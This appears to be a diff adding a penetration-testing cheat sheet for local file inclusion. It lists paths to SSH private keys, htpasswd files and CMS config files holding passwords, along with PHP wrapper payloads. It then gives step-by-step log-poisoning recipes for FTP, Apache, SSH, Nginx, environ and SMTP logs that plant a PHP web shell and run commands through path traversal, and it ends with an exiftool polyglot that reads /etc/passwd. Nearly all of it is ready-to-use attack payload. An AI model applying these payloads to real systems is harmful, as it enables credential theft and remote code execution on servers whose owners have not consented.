@@ -1,0 +1,61 @@
+## **Passwords & Credentials**
+
+## **SSH**
+/var/lib/username/.ssh/id_rsa
+/home/username/.ssh/id_rsa
+
+
+## **Apache**
+/var/log/apache/access.log
+/var/log/apache2/access.log
+/var/log/httpd/access_log
+/var/log/apache/error.log
+/var/log/apache2/error.log
+/var/log/httpd/error_log
+/etc/apache2/htpasswd
+/etc/apache2/.htpasswd
+/etc/apache/.htpasswd
+/etc/apache2/apache2.conf
+
+
+## **CMS**
+**WordPress:** /var/www/html/wp-config.php
+**Joomla:** /var/www/configuration.php
+**Dolphin:** /var/www/html/inc/header.inc.php
+**Drupal:** /var/www/html/sites/default/settings.php
+
+
+## **XAMPP**
+C:/xampp/security/webdav.htpasswd
+C:/xampp/apache/conf/httpd.conf
+C:/xampp/apache/logs/access.log
+
+
+
+# **PHP Wrapper**
+
+php://filter/convert.base64-encode/resource=
+
+file=expect://*whoami*
+
+php://input&cmd=*whoami*
+
+**Log Poisoning
+FTP
+Firstly, you need to be able to access:../../../../../../../../var/log/vsftpd.logIf this is possible, attempt to log in:ftp 192.168.x.xSupply the following name:Name: <?php system($_GET[‘cmd’]); ?>Exit and attempt the below execution:../../../../../../../../var/log/vsftpd.log&cmd=*whoami*
+Apache2 I
+Firstly, you need to be able to access:../../../../../../../../var/log/apache2/access.logIf this is possible, attempt to poison:nc 192.168.xx.xx 80Enter the following and press enter:<?php system($_GET[‘cmd’]); ?>Exit and attempt the below execution:../../../../../../../../var/log/apache2/access.log&cmd=*whoami*
+Apache2 II
+Firstly, you need to be able to access:../../../../../../../../var/log/apache2/access.logIf this is possible, attempt to poison within the User-Agent:<?php system($_GET[‘cmd’]); ?>Exit and attempt the below execution:../../../../../../../../var/log/apache2/access.log&cmd=*whoami*
+SSH
+Firstly, you need to be able to access:../../../../../../../../var/log/auth.logAttempt to login using the following:ssh ‘<?php echo system($_GET[“cmd”]); exit; ?>’[@1](http://twitter.com/10)92.168.x.xExit and attempt the below execution:../../../../../../../../var/log/auth.log&cmd=*whoami*
+Nginx
+Firstly, you need to be able to access:../../../../../../../../var/log/nginx/access.logAttempt to inject the following:http://192.168.x.x/file.php?file=<?php system($_GET[‘cmd’]); ?>Attempt the below execution:../../../../../../../../var/log/nginx/error.log&cmd=*whoami*
+Environ
+Firstly, you need to be able to access:../../../../../../../../proc/self/environIf this is possible, attempt to poison within the User-Agent:<?php system($_GET[‘cmd’]); ?>Exit and attempt the below execution:../../../../../../../../proc/self/environ&cmd=*whoami*
+SMTP
+Get username first (/etc/passwd)telnet 192.168.x.x 25Enter the following:EHLO andyVRFY username@localhostmail from: andy@hack.comrcpt to: username@localhostdataSubject: owned<?php echo system($_REQUEST[‘cmd’]); ?>Press Enter.dot (.)Press Enter.Exit and attempt the below execution:../../../../../../../../var/mail/username&cmd=*whoami***
+
+
+Polyglot Payload:
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
